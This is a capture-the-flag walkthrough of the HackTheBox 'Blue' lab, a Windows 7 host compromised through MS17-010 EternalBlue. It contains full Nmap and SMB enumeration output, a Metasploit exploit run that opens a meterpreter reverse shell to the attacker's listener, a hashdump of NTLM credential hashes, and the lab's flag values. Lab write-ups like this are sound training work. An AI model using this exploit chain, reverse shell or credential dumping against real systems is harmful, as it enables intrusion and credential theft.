---
title: HTB - BLUE - Easy
date: 2026-02-19
tags: ["Windows"]
description: Walkthrough of the HTB - BLUE lab
difficulty: Easy
---


Difficulty: Easy
OS: Windows (Windows 7)
Date: 2026-02-18
IP: 10.129.3.85


# Summary


Blue consisted of a Windows 7 host running a vulnerable version of SMB. Initial access was obtained using MS17-010 which yielded full system access.

---

# Reconnaissance


## Initial Nmap Scan

```bash
nmap -sV -sS -sC -T4 10.129.3.85          
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-19 13:57 -0600

PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 3s, deviation: 2s, median: 1s
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-02-19T19:58:19+00:00
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2026-02-19T19:58:18
|_  start_date: 2026-02-19T19:55:08


```

Findings:

- MS RPC (Port 135)
- SMB (Ports 139,445)
- 6 dynamic ports
- OS: Windows 7 v6.1 (Professional 7601)
- hostname: HARIS-PC

## Nmap UDP Scan

```bash
nmap -sU -sV --top-port 100 10.129.3.85   
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-19 13:57 -0600

PORT     STATE         SERVICE     VERSION
137/udp  open|filtered netbios-ns
138/udp  open|filtered netbios-dgm
500/udp  open|filtered isakmp
4500/udp open|filtered nat-t-ike 
```

Findings: no additional attack surface found

## Full Nmap Scan

```bash
nmap -sV -sS -T4 -p- 10.129.3.85   
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-19 13:57 -0600
Warning: 10.129.3.85 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.129.3.85
Host is up (0.070s latency).
Not shown: 65470 closed tcp ports (reset), 56 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 969.34 seconds
```

Findings: no additional attack surface found

## SMB Enumeration

### Null session attempt (successful)

```bash
smbclient -N -L //10.129.3.85   

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Share           Disk      
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.3.85 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

```bash
crackmapexec smb 10.129.3.85 --shares -u '' -p ''   
SMB         10.129.3.85     445    HARIS-PC         [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:HARIS-PC) (domain:haris-PC) (signing:False) (SMBv1:True)
SMB         10.129.3.85     445    HARIS-PC         [+] haris-PC\: 
SMB         10.129.3.85     445    HARIS-PC         [-] Error enumerating shares: STATUS_ACCESS_DENIED

```

Findings: 5 shares enumerated using smbclient, null session possible

### Access Enumerated Shares (Failure)

```bash
smbclient //10.129.3.85/Users -U '' -N                         
tree connect failed: NT_STATUS_ACCESS_DENIED

smbclient //10.129.3.85/Share -U '' -N
tree connect failed: NT_STATUS_ACCESS_DENIED

smbclient //10.129.3.85/ADMIN$ -U '' -N
tree connect failed: NT_STATUS_ACCESS_DENIED

smbclient //10.129.3.85/C$ -U '' -N
tree connect failed: NT_STATUS_ACCESS_DENIED
```

```bash
smbclient //10.129.3.85/IPC$ -U '' -N
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*
smb: \> whoami
whoami: command not found
smb: \> help
?              allinfo        altname        archive        backup         
blocksize      cancel         case_sensitive cd             chmod          
chown          close          del            deltree        dir            
du             echo           exit           get            getfacl        
geteas         hardlink       help           history        iosize         
lcd            link           lock           lowercase      ls             
l              mask           md             mget           mkdir          
mkfifo         more           mput           newer          notify         
open           posix          posix_encrypt  posix_open     posix_mkdir    
posix_rmdir    posix_unlink   posix_whoami   print          prompt         
put            pwd            q              queue          quit           
readlink       rd             recurse        reget          rename         
reput          rm             rmdir          showacls       setea          
setmode        scopy          stat           symlink        tar            
tarmode        timeout        translate      unlock         volume         
vuid           wdel           logon          listconnect    showconnect    
tcon           tdis           tid            utimes         logoff         
..             !              
smb: \> cd
Current directory is \
smb: \> dir
NT_STATUS_ACCESS_DENIED listing \*
smb: \> exit
```

Findings: was able to access IPC$ share but permission denied to do anything further, moving on

### Enum4linux 

```bash
enum4linux -U 10.129.3.85                         
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Feb 19 14:06:50 2026

 =========================================( Target Information )=========================================

Target ........... 10.129.3.85
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ============================( Enumerating Workgroup/Domain on 10.129.3.85 )============================


[E] Can't find workgroup/domain



 ====================================( Session Check on 10.129.3.85 )====================================


[+] Server 10.129.3.85 allows sessions using username '', password ''


 =================================( Getting domain SID for 10.129.3.85 )=================================

do_cmd: Could not initialise lsarpc. Error was NT_STATUS_ACCESS_DENIED

[+] Can't determine if host is part of domain or part of a workgroup


 ========================================( Users on 10.129.3.85 )========================================


[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED



[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED                       

enum4linux complete on Thu Feb 19 14:07:03 2026                        
```

Findings: nothing additional found

### SMB user enumeration (failed)

```bash
rpcclient -U "" 10.129.3.85 -N   
rpcclient $> ls
command not found: ls
rpcclient $> enumdomuser
command not found: enumdomuser
rpcclient $> enumdomusers
do_cmd: Could not initialise samr. Error was NT_STATUS_ACCESS_DENIED
rpcclient $> ^C
```

Findings: null session allowed but insufficient permissions to enumerate further

### MS17-010 check (vulnerable)

```bash
sudo nmap 10.129.3.85 -sV -p139,445 --script smb-vuln-ms17-010
[sudo] password for kali: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-19 14:16 -0600
Nmap scan report for 10.129.3.85
Host is up (0.067s latency).

PORT    STATE SERVICE      VERSION
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.71 seconds

```

Findings: vulnerable to EternalBlue


---

# Initial Access


## SMB - EternalBlue

```bash
msf > search eternalblue

# trimmed

msf > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf exploit(windows/smb/ms17_010_eternalblue) > set lhost tun0
lhost => tun0
msf exploit(windows/smb/ms17_010_eternalblue) > set rhost 10.129.3.85
rhost => 10.129.3.85
msf exploit(windows/smb/ms17_010_eternalblue) > run
[*] Started reverse TCP handler on 10.10.14.228:4444 
[*] 10.129.3.85:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.129.3.85:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.25/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[*] 10.129.3.85:445       - Scanned 1 of 1 hosts (100% complete)
[+] 10.129.3.85:445 - The target is vulnerable.
[*] 10.129.3.85:445 - Connecting to target for exploitation.
[+] 10.129.3.85:445 - Connection established for exploitation.
[+] 10.129.3.85:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.129.3.85:445 - CORE raw buffer dump (42 bytes)
[*] 10.129.3.85:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.129.3.85:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.129.3.85:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.129.3.85:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.129.3.85:445 - Trying exploit with 12 Groom Allocations.
[*] 10.129.3.85:445 - Sending all but last fragment of exploit packet
[*] 10.129.3.85:445 - Starting non-paged pool grooming
[+] 10.129.3.85:445 - Sending SMBv2 buffers
[+] 10.129.3.85:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.129.3.85:445 - Sending final SMBv2 buffers.
[*] 10.129.3.85:445 - Sending last fragment of exploit packet!
[*] 10.129.3.85:445 - Receiving response from exploit packet
[+] 10.129.3.85:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.129.3.85:445 - Sending egg to corrupted connection.
[*] 10.129.3.85:445 - Triggering free of corrupted buffer.
[*] Sending stage (232006 bytes) to 10.129.3.85
[*] Meterpreter session 1 opened (10.10.14.228:4444 -> 10.129.3.85:49158) at 2026-02-19 14:19:10 -0600
[+] 10.129.3.85:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.129.3.85:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.129.3.85:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > whoami
[-] Unknown command: whoami. Run the help command for more details.
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > 

```

Findings: SYSTEM access acquired

---


# Post-Exploitation

## Credential extraction

```bash
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cdf51b162460b7d5bc898f493751a0cc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
haris:1000:aad3b435b51404eeaad3b435b51404ee:8002bc89de91f6b52d518bde69202dc6:::
meterpreter > 

```

Findings: three accounts extracted, Administrator, Guest, and haris


## User Flag (haris)

```bash
meterpreter > shell
Process 2176 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>dir "C:\Documents and Settings\haris\Desktop\
dir "C:\Documents and Settings\haris\Desktop\
 Volume in drive C has no label.
 Volume Serial Number is BE92-053B

 Directory of C:\Documents and Settings\haris\Desktop

24/12/2017  02:23    <DIR>          .
24/12/2017  02:23    <DIR>          ..
19/02/2026  19:56                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)   3,032,326,144 bytes free

C:\Windows\system32>type "C:\Documents and Settings\haris\Desktop\user.txt
type "C:\Documents and Settings\haris\Desktop\user.txt
dab59abfe4a20cf83e540795e84ff946

C:\Windows\system32>     
```

User Flag: `dab59abfe4a20cf83e540795e84ff946`

## Root Flag

```bash
C:\Windows\system32>dir "C:\Documents and Settings\Administrator\Desktop"
dir "C:\Documents and Settings\Administrator\Desktop"
 Volume in drive C has no label.
 Volume Serial Number is BE92-053B

 Directory of C:\Documents and Settings\Administrator\Desktop

24/12/2017  02:22    <DIR>          .
24/12/2017  02:22    <DIR>          ..
19/02/2026  19:56                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   3,033,165,824 bytes free

C:\Windows\system32>type "C:\Documents and Settings\Administrator\Desktop\root.txt"
type "C:\Documents and Settings\Administrator\Desktop\root.txt"
b6040926b993bae5e1456e6fc264bb50

C:\Windows\system32>

```

Root Flag: `b6040926b993bae5e1456e6fc264bb50`

New knowledge: 

- correct filepath should have been `C:\Users\haris\Desktop\user.txt`
- incorrect command worked on this machine due to a symlink that exists within the target system
- win xp: `C:\Documents and Settings\<user>\Desktop`
- win vista+: `C:\Users\<user>\Desktop`

## Full Attack Path

1. EternalBlue -> SYSTEM access
2. hashdump yielded three credentials
3. User flag found for user haris
4. Root flag found